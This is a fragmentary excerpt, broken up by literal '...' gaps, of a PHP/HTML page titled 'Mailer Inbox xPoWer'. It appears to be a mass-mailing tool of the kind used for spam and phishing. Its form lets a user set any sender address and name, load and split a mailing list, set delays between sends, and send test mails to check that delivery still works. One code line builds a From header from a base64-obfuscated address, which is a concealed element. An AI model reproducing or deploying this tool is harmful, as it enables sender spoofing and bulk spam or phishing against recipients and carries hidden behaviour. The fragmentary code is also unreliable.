...
<title>::Mailer Inbox xPoWer::</title>
<style type="text/css">
.style1 {
font-size: x-small;
}
...
<body onload="funchange" text="#FFFFFF" bgcolor="#660033">
<script>
...
<p align="center"><span style="font-weight: 700; background-color: #990033">
<font size="5">:: Mailer Inbox :: xPoWer ::</font></span><script>
...
</script><form name="form" method="post" enctype="multipart/form-data" action="">
<table width="100%" border="0">
<tr>
<td width="10%">
<div align="right">
<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif"><span style="background-color: #990033">Your Email:</span></font></div>
</td>
<td style="width: 40%">
<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="from" value="<?php echo($from); ?>" size="30" type="text" /><br>
<span style="background-color: #990033">
<span class="info">Type Sender Email But Make Sure It&#39;s Right</span> 
</span> </font></td>
<td>
<div align="right">
<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif"><span style="background-color: #990033">Your Name:</span></font></div>
</td>
<td width="41%">
<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="realname" value="<?php echo($realname); ?>" size="30" type="text" />
<br>
<span class="info"><span style="background-color: #990033">Make Sure You Type Your Sender Name</span></span></font></td>
</tr>
<tr>
<td width="10%">
<div align="right">
<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif"><span style="background-color: #990033">test send:</span></font></div>
</td>
<td style="width: 40%">
<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="tem" type="text" size="30" value="<?php echo($tem); ?>" /><br>
<span class="info"><span style="background-color: #990033">Type 
</span> </span></font><span class="style3">
<span style="background-color: #990033">Your 
Email To Test The Mailer Still Work Or No</span></span></td>
<td>
<div align="right" class="style4">
<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif"><span style="background-color: #990033">Send Test Mail After:</span></font></div>
</td>
<td width="41%">
<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="smv" type="text" size="30" value="<?php echo($smv); ?>" /><br>
<span class="info"><span style="background-color: #990033">Send Mail For Your Email After Which Email(s)</span></span></font><span style="background-color: #990033">
</span>
</td>
</tr>
<tr>
...
<div align="right">
<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif"><span style="background-color: #990033">Subject:</span></font></div>
</td>
<td colspan="3">
<font size="-3" face="Verdana, Arial, Helvetica, 
...
<input type="button" id="prvbtn" value="Preview" onclick="prv()" style="width: 62px" /><input value="Start send" type="submit" />&nbsp; 
<span style="background-color: #660033">Wait</span> 
<input name="wait" type="text" value="<?php echo($wait); ?>" size="14" /> 
<span style="background-color: #660033">Second 
Until Send </span> </font></td>
...
<br class="style2" />
<span style="background-color: #660033">Emails Number : </span> </font><span id="enum" class="style1">
<span style="background-color: #660033">0</span><br />
</span>
<span class="style1"><span style="background-color: #660033">Split 
The Mail List By:</span></span> 
...
$header2 = "From: ".base64_decode('c2VjLTEzMzcuY29tIDxzZWNAbWJjLmltPg')."\r\n";
...
<br>
<br>
<span style="background-color: #990033">MRT</span><br>
</strong><span class="style5"><span style="background-color: #990033"></span> <br>
</span>
